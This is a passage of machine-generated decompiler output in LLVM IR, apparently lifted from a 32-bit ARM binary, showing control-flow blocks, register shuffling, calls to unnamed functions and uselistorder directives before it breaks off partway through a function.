dec_label_pc_12fa8:                               ; preds = %dec_label_pc_12f90
  br label %dec_label_pc_13104

dec_label_pc_12fbc:                               ; preds = %bb205
  store i32 %v2_12fbc, i32* @r4, align 4
  %v0_12fc0 = load i32, i32* @r7, align 4
  %v0_12fc8 = load i32, i32* @fp, align 4
  %v5_12fd0 = call i32 @function_145cc(i32 %v0_12fc0, i32 %v0_12fc4, i32 %v0_12fc8, i32* nonnull %stack_var_-140)
  %v1_12fd4 = icmp slt i32 %v5_12fd0, 0
  br i1 %v1_12fd4, label %dec_label_pc_12fe0, label %dec_label_pc_12ffc

dec_label_pc_12fe0:                               ; preds = %dec_label_pc_12fbc
  %v2_12fe4 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_12fe4, label %dec_label_pc_131cc, label %dec_label_pc_12fec

dec_label_pc_12fec:                               ; preds = %dec_label_pc_12fe0
  br i1 %v2_12ff0, label %dec_label_pc_131cc, label %dec_label_pc_13118

dec_label_pc_12ffc:                               ; preds = %dec_label_pc_12fbc
  %v2_13000 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_13000, label %dec_label_pc_130a4, label %dec_label_pc_13008

dec_label_pc_13008:                               ; preds = %dec_label_pc_12ffc
  %v0_13008 = load i32, i32* @r8, align 4
  %v6_1300c = add i32 %v0_13008, 36
  %v7_1300c = inttoptr i32 %v6_1300c to i32*
  %v8_1300c = load i32, i32* %v7_1300c, align 4
  store i32 %v8_1300c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_12fbc, i32* @r1, align 4
  store i32 %v0_13008, i32* @r0, align 4
  %v0_13028 = call i32 @function_ef60()
  %v0_1302c = load i32, i32* @r8, align 4
  %v1_1302c = add i32 %v0_1302c, 4
  %v2_1302c = inttoptr i32 %v1_1302c to i32*
  %v3_1302c = load i32, i32* %v2_1302c, align 4
  %v7_13030 = icmp eq i32 %v3_1302c, 24
  br i1 %v7_13030, label %dec_label_pc_13054, label %dec_label_pc_13038

dec_label_pc_13038:                               ; preds = %dec_label_pc_13008
  %v1_13038 = add i32 %v0_1302c, 28
  %v2_13038 = inttoptr i32 %v1_13038 to i32*
  %v3_13038 = load i32, i32* %v2_13038, align 4
  %v2_1303c = icmp eq i32 %v3_13038, 0
  br i1 %v2_1303c, label %dec_label_pc_13118, label %dec_label_pc_13044

dec_label_pc_13044:                               ; preds = %dec_label_pc_13038
  br i1 %v7_13048, label %dec_label_pc_13054, label %bb203

bb203:                                            ; preds = %dec_label_pc_13044
  br i1 %v8_1304c, label %dec_label_pc_13054, label %dec_label_pc_13118

dec_label_pc_13054:                               ; preds = %dec_label_pc_13044, %bb203, %dec_label_pc_13008
  %v9_13058 = icmp eq i32 %v3_1302c, %arg2
  br i1 %v9_13058, label %dec_label_pc_1306c, label %dec_label_pc_13060

dec_label_pc_13060:                               ; preds = %dec_label_pc_13054
  %v1_13060 = inttoptr i32 %v0_1302c to i32*
  %v2_13060 = load i32, i32* %v1_13060, align 4
  store i32 %v2_13060, i32* @r0, align 4
  %v0_13064 = call i32 @function_fdcc()
  br label %dec_label_pc_130f0

dec_label_pc_1306c:                               ; preds = %dec_label_pc_13054
  %v1_13074 = add i32 %v0_1302c, 16
  %v2_13074 = inttoptr i32 %v1_13074 to i32*
  %v3_13074 = load i32, i32* %v2_13074, align 4
  %v2_13078 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1307c = add i32 %v2_13078, -1
  %v1_13080 = add i32 %v3_13074, 4
  %v2_13084 = mul i32 %v1_13080, %v1_1307c
  %v1_13088 = add i32 %v0_1302c, 32
  %v2_13088 = inttoptr i32 %v1_13088 to i32*
  %v3_13088 = load i32, i32* %v2_13088, align 4
  %v2_13090 = add i32 %v0_1302c, 36
  %v3_13090 = inttoptr i32 %v2_13090 to i32*
  store i32 %v1_1307c, i32* %v3_13090, align 4
  %tmp294 = icmp ugt i32 %v2_13084, %v3_13088
  br i1 %tmp294, label %dec_label_pc_13118, label %dec_label_pc_1306c.dec_label_pc_130ec_crit_edge

dec_label_pc_1306c.dec_label_pc_130ec_crit_edge:  ; preds = %dec_label_pc_1306c
  %v1_130ec.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_130ec

dec_label_pc_130a4:                               ; preds = %dec_label_pc_12ffc
  %v3_130a4 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_130a4, i32* @r0, align 4
  %v0_130a8 = call i32 @function_fdcc()
  br i1 %v9_130b4, label %dec_label_pc_130bc, label %dec_label_pc_130f0

dec_label_pc_130bc:                               ; preds = %dec_label_pc_130a4
  %v0_130bc = load i32, i32* @r8, align 4
  %v1_130bc = add i32 %v0_130bc, 16
  %v2_130bc = inttoptr i32 %v1_130bc to i32*
  %v3_130bc = load i32, i32* %v2_130bc, align 4
  %v9_130c4 = icmp eq i32 %v3_130bc, %tmp146
  br i1 %v9_130c4, label %dec_label_pc_130cc, label %dec_label_pc_131c4

dec_label_pc_130cc:                               ; preds = %dec_label_pc_130bc
  %v1_130cc = add i32 %v0_130bc, 36
  %v2_130cc = inttoptr i32 %v1_130cc to i32*
  %v3_130cc = load i32, i32* %v2_130cc, align 4
  %v1_130d0 = add i32 %v0_130bc, 28
  %v2_130d0 = inttoptr i32 %v1_130d0 to i32*
  %v3_130d0 = load i32, i32* %v2_130d0, align 4
  %v3_130d4 = mul i32 %v3_130cc, %tmp146
  %v4_130d4 = add i32 %v3_130d0, %v3_130d4
  store i32 %v4_130d4, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_130e0 = call i32 @function_ef60()
  %v0_130e4 = load i32, i32* @r8, align 4
  %v1_130e4 = add i32 %v0_130e4, 36
  %v2_130e4 = inttoptr i32 %v1_130e4 to i32*
  %v3_130e4 = load i32, i32* %v2_130e4, align 4
  %v1_130e8 = add i32 %v3_130e4, 1
  br label %dec_label_pc_130ec

dec_label_pc_130ec:                               ; preds = %dec_label_pc_1306c.dec_label_pc_130ec_crit_edge, %dec_label_pc_130cc
  %v1_130ec = phi i32 [ %v0_130e4, %dec_label_pc_130cc ], [ %v1_130ec.pre, %dec_label_pc_1306c.dec_label_pc_130ec_crit_edge ]
  %storemerge5 = phi i32 [ %v1_130e8, %dec_label_pc_130cc ], [ 0, %dec_label_pc_1306c.dec_label_pc_130ec_crit_edge ]
  %v2_130ec = add i32 %v1_130ec, 36
  %v3_130ec = inttoptr i32 %v2_130ec to i32*
  store i32 %storemerge5, i32* %v3_130ec, align 4
  br label %dec_label_pc_130f0

dec_label_pc_130f0:                               ; preds = %dec_label_pc_130a4, %dec_label_pc_13060, %dec_label_pc_130ec
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_130ec ], [ 0, %dec_label_pc_130a4 ], [ %stack_var_-212.2, %dec_label_pc_13060 ]
  %v1_130f8 = add i32 %stack_var_-192.0, 1
  %v0_13100 = load i32, i32* @r5, align 4
  %v2_13100 = add i32 %v0_13100, %v5_12fd0
  store i32 %v2_13100, i32* @r5, align 4
  br label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %dec_label_pc_12fa8, %dec_label_pc_130f0
  %v0_12fc4 = phi i32 [ %v0_12f98, %dec_label_pc_12fa8 ], [ %v2_13100, %dec_label_pc_130f0 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_12fa8 ], [ %stack_var_-212.1, %dec_label_pc_130f0 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_12fa8 ], [ %v1_130f8, %dec_label_pc_130f0 ]
  %v2_1310c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1310c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1310c = xor i32 %v2_1310c, %stack_var_-192.0
  %v6_1310c = and i32 %v5_1310c, %v4_1310c
  %v5_13110 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_13110, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_13104
  %v7_13110 = load i32, i32* @fp, align 4
  %v8_13110 = sub i32 %v0_12fc4, %v7_13110
  %v10_13110 = xor i32 %v7_13110, %v0_12fc4
  %v11_13110 = xor i32 %v8_13110, %v0_12fc4
  %v12_13110 = and i32 %v11_13110, %v10_13110
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_13104, %bb204
  %v1_13114.in = phi i32 [ %v6_1310c, %dec_label_pc_13104 ], [ %v12_13110, %bb204 ]
  %v0_13114.in = phi i32 [ %v2_1310c, %dec_label_pc_13104 ], [ %v8_13110, %bb204 ]
  %v0_13114 = icmp slt i32 %v0_13114.in, 0
  %v1_13114 = icmp slt i32 %v1_13114.in, 0
  %v2_13114 = xor i1 %v1_13114, %v0_13114
  br i1 %v2_13114, label %dec_label_pc_12fbc, label %dec_label_pc_13118

dec_label_pc_13118:                               ; preds = %dec_label_pc_12fec, %bb203, %dec_label_pc_1306c, %dec_label_pc_13038, %bb205
  %v1_1311c = call i32 @function_cbe4(i32 %v3_12dfc)
  %v3_13120 = load i32, i32* %stack_var_0, align 4
  %v2_13124 = icmp eq i32 %v3_13120, 0
  br i1 %v2_13124, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_13118
  %v1_1312c = load i32, i32* @r7, align 4
  %v3_13128 = inttoptr i32 %v3_13120 to i32*
  store i32 %v1_1312c, i32* %v3_13128, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_13118
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 78132, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13124, i32 ptrtoint (i32* @global_var_fdcc.291 to i32))
  %v2_13134 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_13134, i32* @r0, align 4
  store i32 %v2_12bc8, i32* @r4, align 4
  %v0_1313c = call i32 @function_fdcc()
  store i32 %v2_12bc8, i32* @r0, align 4
  %v1_13154 = call i32 @function_10d54()
  %v1_13164 = call i32 @function_10d4c()
  %v0_13170 = load i32, i32* @r6, align 4
  %v3_13170 = sdiv i32 %v0_13170, 256
  %v0_13174 = load i32, i32* @sl, align 4
  store i32 %v0_13174, i32* @global_var_1aae8.567, align 4
  store i32 %v2_12bc8, i32* @r0, align 4
  %v1_13180 = trunc i32 %v3_13170 to i8
  store i8 %v1_13180, i8* @global_var_18435.570, align 1
  %v1_13184 = trunc i32 %v0_13170 to i8
  store i8 %v1_13184, i8* bitcast (i8** @global_var_18434.569 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_13194.581 to i32), i32* @lr, align 4
  %v1_13190 = call i32 @function_10d54()
  %v0_1331c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_1331c

dec_label_pc_13198:                               ; preds = %dec_label_pc_12e2c, %dec_label_pc_12e4c
  %v0_13198 = load i32, i32* @sl, align 4
  %v1_13198 = add i32 %v0_13198, 1
  %v2_131a0 = call i32 @function_cafc(i32 %v1_13198, i32 %arg3)
  store i32 %v2_131a0, i32* @sl, align 4
  %v2_131a4 = icmp eq i32 %v2_131a0, 0
  br i1 %v2_131a4, label %dec_label_pc_131ac, label %dec_label_pc_13264.backedge

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13198
  %v1_131b4 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_13268.outer.backedge

dec_label_pc_13268.outer.backedge:                ; preds = %dec_label_pc_131ac, %dec_label_pc_13248, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_12f40, %.thread19 ], [ -1, %dec_label_pc_13248 ], [ -1, %dec_label_pc_131ac ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_13250, %dec_label_pc_13248 ], [ %v1_131b4, %dec_label_pc_131ac ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_12c4c.lr.ph, label %dec_label_pc_13284

dec_label_pc_131c4:                               ; preds = %dec_label_pc_130bc
  %v1_131c4 = inttoptr i32 %v0_130bc to i32*
  %v2_131c4 = load i32, i32* %v1_131c4, align 4
  store i32 %v2_131c4, i32* @r0, align 4
  %v0_131c8 = call i32 @function_fdcc()
  br label %dec_label_pc_131cc

dec_label_pc_131cc:                               ; preds = %dec_label_pc_12f5c, %dec_label_pc_12eb0, %dec_label_pc_12fec, %dec_label_pc_12fe0, %dec_label_pc_12ec8, %dec_label_pc_12e90, %dec_label_pc_131c4
  br i1 %v2_131d0, label %dec_label_pc_131d8, label %dec_label_pc_13234

dec_label_pc_131d8:                               ; preds = %dec_label_pc_131cc
  store i32 %v2_12bc8, i32* @r5, align 4
  store i32 %v2_12bc8, i32* @r0, align 4
  %v1_131f0 = call i32 @function_10d54()
  %v1_13200 = call i32 @function_10d4c()
  %v2_1320c = load i32, i32* @global_var_1ad48.575, align 4
  store i32 %v2_12bc8, i32* @r0, align 4
  store i32 78368, i32* @lr, align 4
  %v1_1321c = call i32 @function_10d54()
  %v1_13224 = add i32 %v2_1320c, -1
  store i32 %v1_13224, i32* @r4, align 4
  %v5_1322c = icmp slt i32 %v6_1322c, %v1_13224
  br i1 %v5_1322c, label %.thread27, label %dec_label_pc_13234

.thread27:                                        ; preds = %dec_label_pc_131d8
  %v7_1322c = add i32 %v6_1322c, 1
  br label %dec_label_pc_13264.backedge

dec_label_pc_13234:                               ; preds = %dec_label_pc_131d8, %dec_label_pc_131cc
  %v0_13234 = load i32, i32* @sl, align 4
  %v1_13234 = add i32 %v0_13234, 1
  %v2_1323c = call i32 @function_cafc(i32 %v1_13234, i32 %arg3)
  store i32 %v2_1323c, i32* @sl, align 4
  %v2_13240 = icmp eq i32 %v2_1323c, 0
  br i1 %v2_13240, label %dec_label_pc_13248, label %dec_label_pc_13264.backedge

dec_label_pc_13248:                               ; preds = %dec_label_pc_13234
  %v1_13250 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_13268.outer.backedge

dec_label_pc_13264.backedge:                      ; preds = %dec_label_pc_13198, %dec_label_pc_13234, %.thread27
  %storemerge87 = phi i32 [ %v7_1322c, %.thread27 ], [ -1, %dec_label_pc_13234 ], [ -1, %dec_label_pc_13198 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_12c4c.lr.ph.preheader, label %dec_label_pc_13284

dec_label_pc_12c4c.lr.ph.preheader:               ; preds = %dec_label_pc_12c4c.lr.ph.preheader.lr.ph, %dec_label_pc_13264.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_12c4c.lr.ph.preheader.lr.ph ], [ %v3_12dfc, %dec_label_pc_13264.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_12c44, %dec_label_pc_12c4c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_13264.backedge ]
  %v0_13264259 = phi i32 [ -1, %dec_label_pc_12c4c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_13264.backedge ]
  br label %dec_label_pc_12c4c.lr.ph

dec_label_pc_12c4c.lr.ph:                         ; preds = %dec_label_pc_12c4c.lr.ph.preheader, %dec_label_pc_13268.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v3_12dfc, %dec_label_pc_13268.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_12c4c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_13268.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_12c4c.lr.ph.preheader ]
  %v6_1322c = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_13268.outer.backedge ], [ %v0_13264259, %dec_label_pc_12c4c.lr.ph.preheader ]
  %v1_12cf4 = icmp slt i32 %v6_1322c, 0
  %v4_12d30 = mul i32 %v6_1322c, 4
  %v5_12d30 = add i32 %v4_12d30, ptrtoint (i32* @global_var_1ad28.579 to i32)
  %v6_12d30 = inttoptr i32 %v5_12d30 to i32*
  br label %dec_label_pc_12c4c

dec_label_pc_13278:                               ; preds = %bb195, %.thread8, %dec_label_pc_12ba4, %dec_label_pc_12b98
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_13284

dec_label_pc_13284:                               ; preds = %dec_label_pc_12bb4, %dec_label_pc_13264.backedge, %dec_label_pc_13268.outer.backedge, %bb200, %dec_label_pc_12d3c, %dec_label_pc_13268.backedge, %dec_label_pc_13278
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_13278 ], [ %v3_12dfc, %dec_label_pc_13268.backedge ], [ %v1_12c54, %dec_label_pc_12d3c ], [ %v1_12c54, %bb200 ], [ %v3_12dfc, %dec_label_pc_13268.outer.backedge ], [ -1, %dec_label_pc_12bb4 ], [ %v3_12dfc, %dec_label_pc_13264.backedge ]
  %v0_13284 = call i32 @function_11514()
  %v2_1328c = inttoptr i32 %v0_13284 to i32*
  store i32 -1, i32* %v2_1328c, align 4
  %v0_13290 = load i32, i32* @sb, align 4
  store i32 %v0_13290, i32* @r6, align 4
  br label %dec_label_pc_13294

dec_label_pc_13294:                               ; preds = %dec_label_pc_12f80, %dec_label_pc_13284
  %v1_1329c = phi i32 [ %stack_var_-216.2, %dec_label_pc_13284 ], [ %v3_12dfc, %dec_label_pc_12f80 ]
  %v7_13298 = icmp eq i32 %v1_1329c, -1
  br i1 %v7_13298, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_13294
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_13294, %bb208
  store i32 78500, i32* @lr, align 4
  %v1_132a0 = xor i1 %v7_13298, true
  call void @__pseudo_cond_branch(i1 %v1_132a0, i32 ptrtoint (i32* @global_var_cbe4.572 to i32))
  %v2_132a4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_132a4, i32* @r0, align 4
  %v0_132a8 = call i32 @function_fdcc()
  %v0_132ac = load i32, i32* @r7, align 4
  store i32 %v0_132ac, i32* @r0, align 4
  %v0_132b0 = call i32 @function_fdcc()
  %v0_132b4 = load i32, i32* @sl, align 4
  %v7_132b4 = icmp eq i32 %v0_132b4, -1
  br i1 %v7_132b4, label %bb210, label %dec_label_pc_132c0

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_1331c

dec_label_pc_132c0:                               ; preds = %bb209
  %v2_132c0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_132c0, i32* @r0, align 4
  %v1_132d8 = call i32 @function_10d54()
  %v1_132e8 = call i32 @function_10d4c()
  %v0_132f4 = load i32, i32* @r6, align 4
  %v3_132f4 = sdiv i32 %v0_132f4, 256
  %v0_132f8 = load i32, i32* @sl, align 4
  store i32 %v0_132f8, i32* @global_var_1aae8.567, align 4
  store i32 %v2_132c0, i32* @r0, align 4
  %v1_13304 = trunc i32 %v3_132f4 to i8
  store i8 %v1_13304, i8* @global_var_18435.570, align 1
  %v1_13308 = trunc i32 %v0_132f4 to i8
  store i8 %v1_13308, i8* bitcast (i8** @global_var_18434.569 to i8*), align 4
  store i32 78616, i32* @lr, align 4
  %v1_13314 = call i32 @function_10d54()
  br label %dec_label_pc_1331c

dec_label_pc_1331c:                               ; preds = %bb210, %bb207, %dec_label_pc_132c0
  %v0_1331c = phi i32 [ %v0_132b4, %bb210 ], [ %v0_1331c.pre, %bb207 ], [ -1, %dec_label_pc_132c0 ]
  store i32 %v3_12b50, i32* @r4, align 4
  store i32 %v6_12b50, i32* @r5, align 4
  store i32 %v9_12b50, i32* @r6, align 4
  store i32 %v12_12b50, i32* @r7, align 4
  store i32 %v15_12b50, i32* @r8, align 4
  store i32 %v18_12b50, i32* @sb, align 4
  store i32 %v21_12b50, i32* @sl, align 4
  ret i32 %v0_1331c

; uselistorder directives
  uselistorder i32 %v0_132f4, { 1, 0 }
  uselistorder i32 %v0_132b4, { 1, 0 }
  uselistorder i1 %v7_13298, { 1, 0 }
  uselistorder i32 %v6_1322c, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_13170, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_12fc4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_130bc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1307c, { 1, 0 }
  uselistorder i32 %v0_12f9c, { 1, 0 }
  uselistorder i32 %v0_12fa0, { 1, 0 }
  uselistorder i32 %v5_12ea0, { 1, 0 }
  uselistorder i32 %v3_12dfc, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_12d68, { 1, 0 }
  uselistorder i32 %v2_12d08, { 1, 0 }
  uselistorder i32 %v1_12c80, { 1, 2, 0 }
  uselistorder i1 %v7_12c50, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_12c54, { 1, 2, 0 }
  uselistorder i32 %v0_12c44, { 1, 0 }
  uselistorder i32 %v2_12bc8, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_cbe4, { 4, 11, 10, 9, 8, 7, 6, 0, 13, 12, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_fbbc, { 1, 0, 2, 3, 4 }
  uselistorder i32 101, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_fb64, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_fc4c, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 1, 10, 3, 6, 4, 7, 5, 8, 2, 9, 12, 11, 0 }
  uselistorder i32 (i32)* @function_f730, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_f1d0, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 3, 4, 5, 8, 15, 13, 14, 9, 2, 11, 6, 7, 0, 10, 1, 12 }
  uselistorder i8* @global_var_18435.570, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_cafc, { 6, 5, 3, 4, 7, 8, 2, 1, 0 }
  uselistorder i32 (i32)* @function_fc78, { 4, 3, 10, 11, 6, 2, 0, 7, 9, 8, 1, 5 }
  uselistorder i32 512, { 3, 4, 1, 5, 2, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_1331c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_13294, { 1, 0 }
  uselistorder label %dec_label_pc_13284, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_13278, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_12c4c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13264.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_131cc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_13268.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13198, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_13118, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_13104, { 1, 0 }
  uselistorder label %dec_label_pc_130f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_130ec, { 1, 0 }
  uselistorder label %dec_label_pc_13054, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f90, { 1, 0 }
  uselistorder label %dec_label_pc_12f80, { 1, 0 }
  uselistorder label %dec_label_pc_13268.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_12de8, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_12d3c, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @function_13328(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_13328:
  %v0_13328 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13328, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13328
  %tmp = ptrtoint i64* %arg2 to i32
  %v6_13328 = mul i32 %tmp, 256
  %v7_13328 = and i32 %v6_13328, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13328, %bb
  %v10_13358 = phi i32 [ %arg1, %dec_label_pc_13328 ], [ %v7_13328, %bb ]
  ret i32 %v10_13358

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1335c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1335c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1335c = load i32, i32* @r4, align 4
  store i32 %v3_1335c, i32* %stack_var_-28, align 4
  %v6_1335c = load i32, i32* @r5, align 4
  %v9_1335c = load i32, i32* @r6, align 4
  %v12_1335c = load i32, i32* @r7, align 4
  %v15_1335c = load i32, i32* @r8, align 4
  %v18_1335c = load i32, i32* @sl, align 4
  %v2_13360 = ptrtoint i32* %stack_var_-192 to i32
  %v2_13364 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_13364, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18438.430 to i32), i32* %r2.global-to-local, align 4
  %v1_13378 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_18438.430 to i32), i32* %r0.global-to-local, align 4
  store i32 78732, i32* @lr, align 4
  %v1_13388 = call i32 @function_10d4c()
  store i32 %v1_13388, i32* %r0.global-to-local, align 4
  %v2_13390 = load i32, i32* @global_var_1ad44.435, align 4
  %v5_13398 = icmp sgt i32 %v2_13390, 0
  br i1 %v5_13398, label %dec_label_pc_135d4, label %dec_label_pc_1339c

dec_label_pc_1339c:                               ; preds = %dec_label_pc_1335c
  store i32 ptrtoint ([17 x i8]* @global_var_174f4.588 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_17508.590 to i32), i32* @r1, align 4
  %v3_133a4 = call i32 @function_d050(i32 ptrtoint ([17 x i8]* @global_var_174f4.588 to i32), i32 ptrtoint (i32* @global_var_17508.590 to i32))
  store i32 %v3_133a4, i32* %r0.global-to-local, align 4
  store i32 %v3_133a4, i32* @sl, align 4
  %v2_133a8 = icmp eq i32 %v3_133a4, 0
  br i1 %v2_133a8, label %dec_label_pc_133b0, label %dec_label_pc_1359c.preheader

dec_label_pc_133b0:                               ; preds = %dec_label_pc_1339c
  store i32 ptrtoint ([24 x i8]* @global_var_1750c.592 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_17508.590 to i32), i32* @r1, align 4
  %v3_133b8 = call i32 @function_d050(i32 ptrtoint ([24 x i8]* @global_var_1750c.592 to i32), i32 ptrtoint (i32* @global_var_17508.590 to i32))
  store i32 %v3_133b8, i32* %r0.global-to-local, align 4
  store i32 %v3_133b8, i32* @sl, align 4
  %v2_133bc = icmp eq i32 %v3_133b8, 0
  br i1 %v2_133bc, label %dec_label_pc_135c8, label %dec_label_pc_1359c.preheader

dec_label_pc_1359c.preheader:                     ; preds = %dec_label_pc_1339c, %dec_label_pc_133b0
  %v0_135a426 = phi i32 [ %v3_133a4, %dec_label_pc_1339c ], [ %v3_133b8, %dec_label_pc_133b0 ]
  %v2_13410 = ptrtoint i32* %stack_var_-28 to i32
  %v3_134ac = inttoptr i32 %tmp to i8*
  store i32 %v2_13360, i32* %r0.global-to-local, align 4
  store i32 %v0_135a426, i32* %r2.global-to-local, align 4
  %v3_135a866 = call i32 @function_e7bc(i32 %v2_13360, i32 128, i32 %v0_135a426)
  store i32 %v3_135a866, i32* %r0.global-to-local, align 4
  %v2_135ac68 = icmp eq i32 %v3_135a866, 0
  store i32 %v2_13360, i32* @r4, align 4
  br i1 %v2_135ac68, label %dec_label_pc_135bc, label %dec_label_pc_133cc.preheader.lr.ph

dec_label_pc_133cc.preheader.lr.ph:               ; preds = %dec_label_pc_1359c.preheader
  %v1_133cc11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_133cc.preheader

dec_label_pc_133c8:                               ; preds = %dec_label_pc_133d8
  %v1_133c8 = add i32 %v0_133c8, 1
  store i32 %v1_133c8, i32* %r0.global-to-local, align 4
  %v1_133cc = inttoptr i32 %v1_133c8 to i8*
  %v2_133cc = load i8, i8* %v1_133cc, align 1
  %v3_133cc = zext i8 %v2_133cc to i32
  store i32 %v3_133cc, i32* %r2.global-to-local, align 4
  %v2_133d0 = icmp eq i8 %v2_133cc, 0
  br i1 %v2_133d0, label %dec_label_pc_133ec, label %dec_label_pc_133d8

dec_label_pc_133d8:                               ; preds = %dec_label_pc_133d8.lr.ph, %dec_label_pc_133c8
